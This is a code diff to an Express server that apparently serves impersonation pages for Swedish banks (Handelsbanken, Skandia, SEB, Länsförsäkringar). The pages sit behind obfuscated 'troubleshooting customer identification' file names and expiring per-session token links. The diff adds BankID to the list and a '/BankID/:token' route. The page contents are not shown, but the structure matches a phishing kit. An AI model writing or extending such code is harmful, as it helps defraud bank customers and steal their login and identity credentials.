@@ -85,7 +85,8 @@ const bankPages = {
     'handelsbanken': 'Handelsfelsokningskundidentifieringkund98721311',
     'skandia': 'Skandiafelsokningskundidentifieringkund98721311',
     'seb': 'Sebfelsokningskundidentifieringkund98721311',
-    'lansforsakringar': 'Lansforsakringarfelsokningskundidentifieringkund98721311'
+    'lansforsakringar': 'Lansforsakringarfelsokningskundidentifieringkund98721311',
+    'bankid': 'Bankidfelsokningskundidentifieringkund98721311'
 };
 
 // Bank display names for URLs
@@ -95,7 +96,8 @@ const bankDisplayNames = {
     'handelsbanken': 'Handelsbanken',
     'skandia': 'Skandia',
     'seb': 'SEB',
-    'lansforsakringar': 'Lansforsakringar'
+    'lansforsakringar': 'Lansforsakringar',
+    'bankid': 'BankID'
 };
 
 // Bank routes with and without .html
@@ -154,6 +156,26 @@ Object.entries(bankDisplayNames).forEach(([bankId, bankName]) => {
         const bankPage = bankPages[bankId];
         res.sendFile(path.join(__dirname, 'public', `${bankPage}.html`));
     });
+
+    // Add route for BankID with capital letters
+    if (bankId === 'bankid') {
+        app.get('/BankID/:token', (req, res) => {
+            const { token } = req.params;
+            const session = temporaryUrls.get(token);
+            
+            if (!session || session.expiration < Date.now()) {
+                temporaryUrls.delete(token);
+                return res.status(404).send('This link has expired or is invalid');
+            }
+            
+            if (session.bankId !== bankId) {
+                return res.status(404).send('Invalid bank URL');
+            }
+            
+            const bankPage = bankPages[bankId];
+            res.sendFile(path.join(__dirname, 'public', `${bankPage}.html`));
+        });
+    }
 });
 
 // Existing bank routes (keeping for backward compatibility)
